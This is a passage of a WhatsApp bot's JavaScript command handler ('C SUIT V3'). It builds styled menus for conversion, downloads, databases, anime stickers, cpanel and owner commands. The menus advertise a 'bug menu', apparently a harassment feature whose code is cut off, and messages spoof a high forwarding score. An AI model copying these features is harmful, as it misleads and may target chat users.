> 𝙰𝚄𝚃𝙾𝚃𝚈𝙿𝙸𝙽𝙶 𝙾𝙽/𝙾𝙵𝙵
> 𝙰𝚄𝚃𝙾𝚁𝙴𝙲𝙾𝚁𝙳𝙸𝙽𝙶 𝙾𝙽/𝙾𝙵𝙵
> 𝙰𝚄𝚃𝙾𝚁𝙴𝙲𝙾𝚁𝙳𝚃𝚈𝙿 𝙾𝙽/𝙾𝙵𝙵
> 𝙰𝚄𝚃𝙾𝙱𝙸𝙾 𝙾𝙽/𝙾𝙵𝙵
> 𝙰𝚄𝚃𝙾𝚂𝚃𝙰𝚃𝚄𝚂𝚅𝙸𝙴𝚆 𝙾𝙽/𝙾𝙵𝙵
> 𝙼𝙾𝙳𝙴 𝙿𝚄𝙱𝙻𝙸𝙲/𝚂𝙴𝙻𝙵
> 𝙱𝙻𝙾𝙲𝙺
> 𝚄𝙽𝙱𝙻𝙾𝙲𝙺
> 𝙱𝙰𝙲𝙺𝚄𝙿
> 𝙶𝙴𝚃𝙲𝙰𝚂𝙴
> 𝙰𝙳𝙳𝙾𝚆𝙽𝙴𝚁
> 𝙳𝙴𝙻𝙾𝚆𝙽𝙴𝚁
▂ ▄ ▅ ▆ ▇ ꉓꌗꀎꀤ꓄ V3▇ ▆ ▅ ▄ ▂ `
if (typemenu === 'v1') {
                    LostBoyTechInc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                title: botname,
                                body: ownername,
                                thumbnailUrl: 'https://files.catbox.moe/s7huhm.jpg',
                                sourceUrl: link,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                            }
                        }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v2') {
                    LostBoyTechInc.sendMessage(m.chat, {
      video: fs.readFileSync('./C-SMedia/11.mp3'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://files.catbox.moe/s7huhm.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                } else if (typemenu === 'v3') {
                    LostBoyTechInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./C-SMedia/11.mp3'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    LostBoyTechInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                           callType: "AUDIO",
                           scheduledTimestampMs: 1200,
                           title: xmenu_oh
                        }
                    }, {})
                }
                break
                
                case 'convertmenu2':
                 xmenu_oh = `
*𝙾𝚆𝙽𝙴𝚁: ${global.ownername}*
*𝙿𝚁𝙴𝙵𝙸𝚇: ⌕${global.prefa}⌕*
*𝚄𝙿𝚃𝙸𝙼𝙴: ${runtime(process.uptime())}*
*𝙰𝙲𝙲𝙾𝚄𝙽𝚃 𝚃𝚈𝙿𝙴: ${isPremium ? "Premium" : "Free"}*
*𝙷𝙾𝚂𝚃: ${os.hostname()}*
*𝙿𝙻𝙰𝚃𝙵𝙾𝚁𝙼: ${os.platform()}*
■□■□■□■□□■□■□□■□■□
> 𝙷𝙴𝙻𝙻𝙾 ${pushname}
□■□■□■□■□□■□■□■□■□
${readmore}
 ᑕOᑎᐯᗴᖇT ᗰᗴᑎᑌ
 
> 𝚂𝚃𝙸𝙺𝙴𝚁
> 𝚂𝙼𝙴𝙼𝙴
> 𝚃𝙾𝙸𝙼𝙰𝙶𝙴
> 𝚃𝙾𝚅𝙸𝙳𝙴𝙾
> 𝚃𝙾𝙰𝚄𝙳𝙸𝙾
> 𝚃𝙾𝙼𝙿𝟹
> 𝚃𝙾𝚅𝙽
> 𝚃𝙾𝙶𝙸𝙵
> 𝚃𝙾𝚄𝚁𝙻
> 𝚃𝙾𝚀𝚁
> 𝚃𝙾𝚅𝙸𝙴𝚆𝙾𝙽𝙲𝙴
> 𝙵𝙻𝙸𝙿𝚃𝙴𝚇𝚃
> 𝙴𝙼𝙾𝙹𝙸𝙼𝙸𝚇
▂ ▄ ▅ ▆ ▇ ꉓꌗꀎꀤ꓄ V3▇ ▆ ▅ ▄ ▂ `
if (typemenu === 'v1') {
                    LostBoyTechInc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                title: botname,
                                body: ownername,
                                thumbnailUrl: 'https://files.catbox.moe/s7huhm.jpg',
                                sourceUrl: link,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                            }
                        }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v2') {
                    LostBoyTechInc.sendMessage(m.chat, {
      video: fs.readFileSync('./C-SMedia/11.mp3'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://files.catbox.moe/8x33pv.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                } else if (typemenu === 'v3') {
                    LostBoyTechInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./C-SMedia/11.mp3'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    LostBoyTechInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                           callType: "AUDIO",
                           scheduledTimestampMs: 1200,
                           title: xmenu_oh
                        }
                    }, {})
                }
                break
                case 'databasemenu2':
                 xmenu_oh = `
*𝙾𝚆𝙽𝙴𝚁: ${global.ownername}*
*𝙿𝚁𝙴𝙵𝙸𝚇: ⌕${global.prefa}⌕*
*𝚄𝙿𝚃𝙸𝙼𝙴: ${runtime(process.uptime())}*
*𝙰𝙲𝙲𝙾𝚄𝙽𝚃 𝚃𝚈𝙿𝙴: ${isPremium ? "Premium" : "Free"}*
*𝙷𝙾𝚂𝚃: ${os.hostname()}*
*𝙿𝙻𝙰𝚃𝙵𝙾𝚁𝙼: ${os.platform()}*
■□■□■□■□□■□■□□■□■□
> 𝙷𝙴𝙻𝙻𝙾 ${pushname}
□■□■□■□■□□■□■□■□■□
${readmore}
 ᗪᗩTᗩᗷᗩՏᗴ ᗰᗴᑎᑌ 
 
> 𝙰𝙳𝙳𝚅𝙸𝙳𝙴𝙾
> 𝙰𝙳𝙳𝙸𝙼𝙰𝙶𝙴
> 𝙰𝙳𝙳𝚂𝚃𝙸𝙲𝙺𝙴𝚁
> 𝙰𝙳𝙳𝚅𝙽
> 𝙰𝙳𝙳𝚉𝙸𝙿
> 𝙰𝙳𝙳𝙰𝙿𝙺
> 𝙰𝙳𝙳𝙿𝙳𝙵
> 𝙳𝙴𝙻𝚅𝙸𝙳𝙴𝙾
> 𝙳𝙴𝙻𝙸𝙼𝙰𝙶𝙴
> 𝙳𝙴𝙻𝚂𝚃𝙸𝙲𝙺𝙴𝚁
> 𝙳𝙴𝙻𝚅𝙽
> 𝙳𝙴𝙻𝚉𝙸𝙿
> 𝙳𝙴𝙻𝙰𝙿𝙺
> 𝙳𝙴𝙻𝙿𝙳𝙵
> 𝙻𝙸𝚂𝚃𝚅𝙸𝙳𝙴𝙾
> 𝙻𝙸𝚂𝚃𝙸𝙼𝙰𝙶𝙴
> 𝙻𝙸𝚂𝚃𝚂𝚃𝙸𝙲𝙺𝙴𝚁
> 𝙻𝙸𝚂𝚃𝚅𝙽
> 𝙻𝙸𝚂𝚃𝚉𝙸𝙿
> 𝙻𝙸𝚂𝚃𝙰𝙿𝙺
> 𝙻𝙸𝚂𝚃𝙿𝙳𝙵
▂ ▄ ▅ ▆ ▇ ꉓꌗꀎꀤ꓄ V3▇ ▆ ▅ ▄ ▂ `
if (typemenu === 'v1') {
                    LostBoyTechInc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                title: botname,
                                body: ownername,
                                thumbnailUrl: 'https://files.catbox.moe/8x33pv.jpg',
                                sourceUrl: link,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                            }
                        }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v2') {
                    LostBoyTechInc.sendMessage(m.chat, {
      video: fs.readFileSync('./C-SMedia/11.mp3'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://files.catbox.moe/8x33pv.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                } else if (typemenu === 'v3') {
                    LostBoyTechInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./C-SMedia/11.mp3'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    LostBoyTechInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                           callType: "AUDIO",
                           scheduledTimestampMs: 1200,
                           title: xmenu_oh
                        }
                    }, {})
                }
                break
                case 'downloadmenu2':
                xmenu_oh = `
*𝙾𝚆𝙽𝙴𝚁: ${global.ownername}*
*𝙿𝚁𝙴𝙵𝙸𝚇: ⌕${global.prefa}⌕*
*𝚄𝙿𝚃𝙸𝙼𝙴: ${runtime(process.uptime())}*
*𝙰𝙲𝙲𝙾𝚄𝙽𝚃 𝚃𝚈𝙿𝙴: ${isPremium ? "Premium" : "Free"}*
*𝙷𝙾𝚂𝚃: ${os.hostname()}*
*𝙿𝙻𝙰𝚃𝙵𝙾𝚁𝙼: ${os.platform()}*
■□■□■□■□□■□■□□■□■□
> 𝙷𝙴𝙻𝙻𝙾 ${pushname}
□■□■□■□■□□■□■□■□■□
${readmore}
ᗪOᗯᑎᒪOᗩᗪ ᗰᗴᑎᑌ

> 𝙶𝙸𝚃
> 𝙶𝙸𝚃𝙲𝙻𝙾𝙽𝙴
> 𝙿𝙻𝙰𝚈
> 𝚈𝚃𝙼𝙿𝟹
> 𝚈𝚃𝙼𝙿𝟺
> 𝚂𝙾𝚄𝙽𝙳 𝟷 - 𝚂𝙾𝚄𝙽𝙳𝟷𝟼𝟷
▂ ▄ ▅ ▆ ▇ ꉓꌗꀎꀤ꓄ V3▇ ▆ ▅ ▄ ▂ `
if (typemenu === 'v1') {
                    LostBoyTechInc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                title: botname,
                                body: ownername,
                                thumbnailUrl: 'https://files.catbox.moe/8x33pv.jpg',
                                sourceUrl: link,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                            }
                        }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v2') {
                    LostBoyTechInc.sendMessage(m.chat, {
      video: fs.readFileSync('./C-SMedia/11.mp3'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://files.catbox.moe/8x33pv.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                } else if (typemenu === 'v3') {
                    LostBoyTechInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./C-SMedia/11.mp3'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    LostBoyTechInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                           callType: "AUDIO",
                           scheduledTimestampMs: 1200,
                           title: xmenu_oh
                        }
                    }, {})
                }
                break
                case 'animemenu2':
                xmenu_oh = `
■□■□■□■□□■□■□□■□■□
> Hello ${pushname}
□■□■□■□■□□■□■□■□■□
> ╰⭑➤⭑➤ ${lostboytimewisher} 😇
${readmore}

 *𝙾𝚆𝙽𝙴𝚁: ${global.ownername}*
*𝙿𝚁𝙴𝙵𝙸𝚇: ⌕${global.prefa}⌕*
*𝚄𝙿𝚃𝙸𝙼𝙴: ${runtime(process.uptime())}*
*𝙰𝙲𝙲𝙾𝚄𝙽𝚃 𝚃𝚈𝙿𝙴: ${isPremium ? "Premium" : "Free"}*
*𝙷𝙾𝚂𝚃: ${os.hostname()}*
*𝙿𝙻𝙰𝚃𝙵𝙾𝚁𝙼: ${os.platform()}*
■□■□■□■□□■□■□□■□■□
> 𝙷𝙴𝙻𝙻𝙾 ${pushname}
□■□■□■□■□□■□■□■□■□
${readmore}
  ᗩᑎIᗰᗴ ᗰᗴᑎᑌ

> 𝚂𝚃𝙸𝙲𝙺𝙰𝚆𝙾𝙾
> 𝚂𝚃𝙸𝙲𝙺𝚆𝙰𝚅𝙴
> 𝚂𝚃𝙸𝙲𝙺𝙴𝚁𝙱𝙻𝚄𝚂𝙷
> 𝚂𝚃𝙸𝙲𝙺𝙲𝚁𝙸𝙽𝙶𝙴
> 𝚂𝚃𝙸𝙲𝙺𝙷𝙰𝙿𝙿𝚈
> 𝚂𝚃𝙸𝙲𝙺𝙶𝙻𝙾𝙼𝙿
> 𝚂𝚃𝙸𝙲𝙺𝙳𝙰𝙽𝙲𝙴
> 𝚂𝚃𝙸𝙲𝙺𝙼𝚄𝙶
> 𝚂𝚃𝙸𝙲𝙺𝙷𝙸𝙶𝙷𝙵𝙸𝚅𝙴
> 𝚂𝚃𝙸𝙲𝙺𝚂𝙷𝙸𝙽𝙾𝙱𝚄
> 𝚂𝚃𝙸𝙲𝙺𝙲𝚄𝙳𝙳𝙻𝙴
                    ▂ ▄ ▅ ▆ ▇ ꉓꌗꀎꀤ꓄ V3▇ ▆ ▅ ▄ ▂ `
if (typemenu === 'v1') {
                    LostBoyTechInc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                title: botname,
                                body: ownername,
                                thumbnailUrl: 'https://files.catbox.moe/l1srou.jpg',
                                sourceUrl: link,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                            }
                        }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v2') {
                    LostBoyTechInc.sendMessage(m.chat, {
      video: fs.readFileSync('./C-SMedia/11.mp3'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://files.catbox.moe/l1srou.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                } else if (typemenu === 'v3') {
                    LostBoyTechInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./C-SMedia/11.mp3'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    LostBoyTechInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                           callType: "AUDIO",
                           scheduledTimestampMs: 1200,
                           title: xmenu_oh
                        }
                    }, {})
                }
                break
               case 'cpanelmenu2':
                xmenu_oh = `
*𝙾𝚆𝙽𝙴𝚁: ${global.ownername}*
*𝙿𝚁𝙴𝙵𝙸𝚇: ⌕${global.prefa}⌕*
*𝚄𝙿𝚃𝙸𝙼𝙴: ${runtime(process.uptime())}*
*𝙰𝙲𝙲𝙾𝚄𝙽𝚃 𝚃𝚈𝙿𝙴: ${isPremium ? "Premium" : "Free"}*
*𝙷𝙾𝚂𝚃: ${os.hostname()}*
*𝙿𝙻𝙰𝚃𝙵𝙾𝚁𝙼: ${os.platform()}*
■□■□■□■□□■□■□□■□■□
> 𝙷𝙴𝙻𝙻𝙾 ${pushname}
□■□■□■□■□□■□■□■□■□
${readmore}
 ᑕᑭᗩᑎᗴᒪ ᗰᗴᑎᑌ
 
> 𝙻𝙸𝚂𝚃𝚁𝙰𝙼
> 𝙻𝙸𝚂𝚃𝚂𝚁𝚅
> 𝙰𝙳𝙳𝙿𝚁𝙴𝙼
> 𝙿𝙰𝙽𝙴𝙻𝙼𝙴𝙽𝚄
> 𝙿𝙰𝚈
> 𝙾𝚆𝙽𝙴𝚁
▂ ▄ ▅ ▆ ▇ ꉓꌗꀎꀤ꓄ V3▇ ▆ ▅ ▄ ▂ `
if (typemenu === 'v1') {
                    LostBoyTechInc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                title: botname,
                                body: ownername,
                                thumbnailUrl: 'https://files.catbox.moe/l1srou.jpg',
                                sourceUrl: link,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                            }
                        }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v2') {
                    LostBoyTechInc.sendMessage(m.chat, {
      video: fs.readFileSync('./C-SMedia/11.mp3'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://files.catbox.moe/l1srou.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                } else if (typemenu === 'v3') {
                    LostBoyTechInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./C-SMedia/11.mp3'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    LostBoyTechInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                           callType: "AUDIO",
                           scheduledTimestampMs: 1200,
                           title: xmenu_oh
                        }
                    }, {})
                }
                break
          
case 'menu': {await LostBoyTechInc.sendMessage(m.chat, { react: { text: `💣`, key: m.key }})
  const caption = `C SUIT V3
*𝙾𝚆𝙽𝙴𝚁: ${global.ownername}*
*𝙿𝚁𝙴𝙵𝙸𝚇: ⌕${global.prefa}⌕*
*𝚄𝙿𝚃𝙸𝙼𝙴: ${runtime(process.uptime())}*
*𝙰𝙲𝙲𝙾𝚄𝙽𝚃 𝚃𝚈𝙿𝙴: ${isPremium ? "Premium" : "Free"}*
*𝙷𝙾𝚂𝚃: ${os.hostname()}*
*𝙿𝙻𝙰𝚃𝙵𝙾𝚁𝙼: ${os.platform()}*

■□■□■□■□□■□■□□■□■□
> 𝙷𝙴𝙻𝙻𝙾 ${pushname}
□■□■□■□■□□■□■□■□■□

 ᴘʀᴇꜱꜱ ʙᴜᴛᴛᴏɴ ʙᴇʟʟᴏᴡ!`;

  let buttons = [
    {
      buttonId: 'menulist',
      buttonText: { displayText: 'This Button List' },
      type: 1
    }
  ];

  let buttonMessage = {
    image: { url: "https://files.catbox.moe/8x33pv.jpg" },
    gifPlayback: true,
    caption: caption,
    contextInfo: {
      externalAdReply: {
        title: '🏷 C SUIT V3',
        body: 'LOSTBOY SOLOS',
        showAdAttribution: true,
        thumbnailUrl: `https://files.catbox.moe/l1srou.jpg`,
        mediaType: 4,
        MediaUrl: 'https://files.catbox.moe/l1srou.jpg',
        sourceUrl: "https://whatsapp.com/channel/0029ValF0TZEAKWNPknJ6I0I",
      }
    },
    footer: "© C SUIT",
    buttons: [
      {
        buttonId: 'ownermenu',
        buttonText: { displayText: '𝙾𝚆𝙽𝙴𝚁𝙼𝙴𝙽𝚄' },
        type: 1
      },
            {
        buttonId: 'cpanelmenu',
        buttonText: { displayText: '𝙲𝙿𝙰𝙽𝙴𝙻𝙼𝙴𝙽𝚄' },
        type: 1
      },
            {
        buttonId: 'downloadmenu',
        buttonText: { displayText: '𝙳𝙾𝚆𝙽𝙻𝙾𝙰𝙳𝙼𝙴𝙽𝚄'},
        type: 1
      },

    ],
    viewOnce: true,
    headerType: 4
  };

  const flowActions = [
    {
      buttonId: 'action',
      buttonText: { displayText: 'This Button List' },
      type: 4,
      nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: "𝗦𝗲𝗹𝗲𝗰𝘁 𝗠𝗲𝗻𝘂",
          sections: [
            {
              title: "This is a frequently used command",
              highlight_label: "POPULER",
              rows: [
                { title: "👑 𝗔𝗟𝗟 𝗠𝗘𝗡𝗨", description: "❄", id: ".allmenu" }
              ]
            },
            {
  title: "Please select the menu button below",
  highlight_label: "Show ",
  rows: [
    { title: "Ownermenu", description: "💯", id: "👑 𝐎𝐰𝐧𝐞𝐫𝐦𝐞𝐧𝐮" },
    { title: "bugmenu", description: "🦠", id: ".👑 𝐁𝐮𝐠𝐦𝐞𝐧𝐮" },
    { title: "funmenu", description: "👾", id: ".👑 𝐅𝐔𝐍𝐌𝐄𝐍𝐔" },
        { title: "databasemenu", description: "🦠🚫", id: ".👑 𝐃𝐀𝐓𝐀𝐁𝐀𝐒𝐄𝐌𝐄𝐍𝐔" },
        { title: "downloadmenu", description: "🦠🚫", id: ".👑 𝐃𝐎𝐖𝐍𝐋𝐎𝐀𝐃𝐌𝐄𝐍𝐔" },
        { title: "mainmenu", description: "🦠🚫", id: ".👑 𝐌𝐀𝐈𝐍𝐌𝐄𝐍𝐔" },
        { title: "creampiemenu", description: "🦠🚫", id: ".👑 𝐂𝐑𝐄𝐀𝐌𝐏𝐈𝐄𝐌𝐄𝐍𝐔" },
    { title: "Animemenu", description: "🦠🚫", id: ".👑 𝐀𝐍𝐈𝐌𝐄𝐌𝐄𝐍𝐔" },
    { title: "Cpanelmenu", description: "🦠✳️", id: ".👑 𝐂𝐏𝐀𝐍𝐄𝐋𝐌𝐄𝐍𝐔" },
  ]
}
]
})
},
viewOnce: true
},
];

// Tambahkan flowActions ke buttonMessage
buttonMessage.buttons.push(...flowActions);

// Kirim pesan
await LostBoyTechInc.sendMessage(m.chat, buttonMessage, { quoted: m });
await sleep(2000)

await LostBoyTechInc.sendMessage(m.chat, {
audio: darkphonk,
mimetype: 'audio/mpeg'
}, { quoted: m })
}
break
case 'allmenu':{await LostBoyTechInc.sendMessage(m.chat, { react: { text: `🤡`, key: m.key }})
const caption = `
*𝙾𝚆𝙽𝙴𝚁: ${global.ownername}*
*𝙿𝚁𝙴𝙵𝙸𝚇: ⌕${global.prefa}⌕*
*𝚄𝙿𝚃𝙸𝙼𝙴: ${runtime(process.uptime())}*
*𝙰𝙲𝙲𝙾𝚄𝙽𝚃 𝚃𝚈𝙿𝙴: ${isPremium ? "Premium" : "Free"}*
*𝙷𝙾𝚂𝚃: ${os.hostname()}*
*𝙿𝙻𝙰𝚃𝙵𝙾𝚁𝙼: ${os.platform()}*
■□■□■□■□□■□■□□■□■□
> 𝙷𝙴𝙻𝙻𝙾 ${pushname}
□■□■□■□■□□■□■□■□■□
${readmore}
 ᗩᒪᒪᗰᗴᑎᑌ 

> 𝙱𝚄𝙶𝙼𝙴𝙽𝚄
> 𝙵𝚄𝙽 𝙼𝙴𝙽𝚄
> 𝙾𝚆𝙽𝙴𝚁𝙼𝙴𝙽𝚄
> 𝙼𝙰𝙸𝙽𝙼𝙴𝙽𝚄
> 𝙲𝙾𝙽𝚅𝙴𝚁𝚃𝙼𝙴𝙽𝚄
> 𝙳𝙰𝚃𝙰𝙱𝙰𝚂𝙴𝙼𝙴𝙽𝚄
> 𝙳𝙾𝚆𝙽𝙻𝙾𝙰𝙳𝙼𝙴𝙽𝚄
> 𝙰𝙽𝙸𝙼𝙴𝙼𝙴𝙽𝚄
> 𝙲𝚁𝙴𝙰𝙼𝙿𝙸𝙴𝙼𝙴𝙽𝚄
> 𝙲𝙿𝙰𝙽𝙴𝙻𝙼𝙴𝙽𝚄.
> 𝙼𝙴𝙽𝚄2
> 𝙱𝚄𝙶𝙼𝙴𝙽𝚄2
> 𝙵𝚄𝙽𝙼𝙴𝙽𝚄 2
> 𝙾𝚆𝙽𝙴𝚁𝙼𝙴𝙽𝚄2
> 𝙼𝙰𝙸𝙽𝙼𝙴𝙽𝚄2
> 𝙲𝙾𝙽𝚅𝙴𝚁𝚃𝙼𝙴𝙽𝚄2
> 𝙳𝙰𝚃𝙰𝙱𝙰𝚂𝙴𝙼𝙴𝙽𝚄2
> 𝙳𝙾𝚆𝙽𝙻𝙾𝙰𝙳𝙴𝙽𝚄2
> 𝙰𝙽𝙸𝙼𝙴𝙼𝙴𝙽𝚄2
> 𝙲𝚁𝙴𝙰𝙼𝙿𝙸𝙴𝙼𝙴𝙽𝚄2`;

  LostBoyTechInc.sendMessage(m.chat, {
    image: { url: "https://files.catbox.moe/8x33pv.jpg" },
    caption,
    mentions: [m.sender],
    footer: global.botName,
    buttons: [
   
      
            {
        buttonId: 'databasemenu',
        buttonText: { 
        displayText: '𝙳𝙰𝚃𝙰𝙱𝙰𝚂𝙴𝙼𝙴𝙽𝚄'},
        
      },
            {
        buttonId: 'cpanelmenu',
        buttonText: {
         displayText: '𝙲𝙿𝙰𝙽𝙴𝙻𝙼𝙴𝙽𝚄' },
        
      },
            {
        buttonId: 'animemenu',
        buttonText: {
         displayText: '𝙰𝙽𝙸𝙼𝙴𝙼𝙴𝙽𝚄'},
        
      },
    ],
    viewOnce: true,
    headerType: 6,
    quoted: m,
    contextInfo: {
      isForwarded: true,
      forwardingScore: 99999,
      forwardedNewsletterMessageInfo: {
        newsletterJid: `1203233549551004@newsletter`, // Use the newsletterJid here
        newsletterName: `LOSTBOY` // Add the newsletter name here
      }
    }
  });

await sleep(2000)

  await LostBoyTechInc.sendMessage(m.chat, {
    audio: darkphonk,
    mimetype: 'audio/mpeg'
  }, { quoted: m })
}
break
case 'ownermenu':{await LostBoyTechInc.sendMessage(m.chat, { react: { text: `👻`, key: m.key }})
const caption = `*𝙾𝚆𝙽𝙴𝚁: ${global.ownername}*
*𝙿𝚁𝙴𝙵𝙸𝚇: ⌕${global.prefa}⌕*
*𝚄𝙿𝚃𝙸𝙼𝙴: ${runtime(process.uptime())}*
*𝙰𝙲𝙲𝙾𝚄𝙽𝚃 𝚃𝚈𝙿𝙴: ${isPremium ? "Premium" : "Free"}*
*𝙷𝙾𝚂𝚃: ${os.hostname()}*
*𝙿𝙻𝙰𝚃𝙵𝙾𝚁𝙼: ${os.platform()}*
■□■□■□■□□■□■□□■□■□
> 𝙷𝙴𝙻𝙻𝙾 ${pushname}
□■□■□■□■□□■□■□■□■□
${readmore}
 Oᗯᑎᗴᖇ ᗰᗴᑎᑌ 

> 𝙶𝙴𝚃𝚂𝙴𝚂𝚂𝙸𝙾𝙽
> 𝙳𝙴𝙻𝙴𝚃𝙴𝚂𝙴𝚂𝚂𝙸𝙾𝙽
> 𝙹𝙾𝙸𝙽
> 𝚂𝙷𝚄𝚃𝙳𝙾𝚆𝙽
> 𝚁𝙴𝚂𝚃𝙰𝚁𝚃
> 𝙰𝚄𝚃𝙾𝚁𝙴𝙰𝙳 𝙾𝙽/𝙾𝙵𝙵
> 𝙰𝚄𝚃𝙾𝚃𝚈𝙿𝙸𝙽𝙶 𝙾𝙽/𝙾𝙵𝙵
> 𝙰𝚄𝚃𝙾𝚁𝙴𝙲𝙾𝚁𝙳𝙸𝙽𝙶 𝙾𝙽/𝙾𝙵𝙵
> 𝙰𝚄𝚃𝙾𝚁𝙴𝙲𝙾𝚁𝙳𝚃𝚈𝙿 𝙾𝙽/𝙾𝙵𝙵
> 𝙰𝚄𝚃𝙾𝙱𝙸𝙾 𝙾𝙽/𝙾𝙵𝙵
> 𝙰𝚄𝚃𝙾𝚂𝚃𝙰𝚃𝚄𝚂𝚅𝙸𝙴𝚆 𝙾𝙽/𝙾𝙵𝙵
> 𝙼𝙾𝙳𝙴 𝙿𝚄𝙱𝙻𝙸𝙲/𝚂𝙴𝙻𝙵
> 𝙱𝙻𝙾𝙲𝙺
> 𝚄𝙽𝙱𝙻𝙾𝙲𝙺
> 𝙱𝙰𝙲𝙺𝚄𝙿
> 𝙶𝙴𝚃𝙲𝙰𝚂𝙴
> 𝙰𝙳𝙳𝙾𝚆𝙽𝙴𝚁
> 𝙳𝙴𝙻𝙾𝚆𝙽𝙴𝚁
▂ ▄ ▅ ▆ ▇ ꉓꌗꀎꀤ꓄ V3 ▇ ▆ ▅ ▄ ▂ `;

  LostBoyTechInc.sendMessage(m.chat, {
    image: { url: "https://files.catbox.moe/8x33pv.jpg" },
    caption,
    mentions: [m.sender],
    footer: global.botName,
    buttons: [

            {
        buttonId: 'mainmenu',
        buttonText: { 
        displayText: '𝙼𝙰𝙸𝙽𝙼𝙴𝙽𝚄' },
        
      },
            {
        buttonId: 'creampiemenu',
        buttonText: {
         displayText: '𝙲𝚁𝙴𝙰𝙼𝙿𝙸𝙴𝙼𝙴𝙽𝚄' },
        
      },
      {
        buttonId: 'bugmenu',
        buttonText: { 
        displayText: '𝙱𝚄𝙶𝙼𝙴𝙽𝚄' },

      },

    ],
    viewOnce: true,
    headerType: 6,
    quoted: m,
    contextInfo: {
      isForwarded: true,
      forwardingScore: 99999,
      forwardedNewsletterMessageInfo: {
        newsletterJid: `1203233549551004@newsletter`, // Use the newsletterJid here
        newsletterName: `LOSTBOY ` // Add the newsletter name here
      }
    }
  });

await sleep(2000)

  await LostBoyTechInc.sendMessage(m.chat, {
    audio: darkphonk,
    mimetype: 'audio/mpeg'
  }, { quoted: m })
}
break
case 'bugmenu':{await LostBoyTechInc.sendMessage(m.chat, { react: { text: `💀`, key: m.key }})
const caption = ` ᗷᑌᘜ ᗰᗴᑎᑌ 
*𝙾𝚆𝙽𝙴𝚁: ${global.ownername}*
*𝙿𝚁𝙴𝙵𝙸𝚇: ⌕${global.prefa}⌕*
*𝚄𝙿𝚃𝙸𝙼𝙴: ${runtime(process.uptime())}*
*𝙰𝙲𝙲𝙾𝚄𝙽𝚃 𝚃𝚈𝙿𝙴: ${isPremium ? "Premium" : "Free"}*
*𝙷𝙾𝚂𝚃: ${os.hostname()}*
*𝙿𝙻𝙰𝚃𝙵𝙾𝚁𝙼: ${os.platform()}*
■□■□■□■□□■□■□□■□■□
> 𝙷𝙴𝙻𝙻𝙾 ${pushname}
□■□■□■□■□□■□■□■□■□
${readmore}

 ᗩᑎᗪᖇOIᗪ 
 
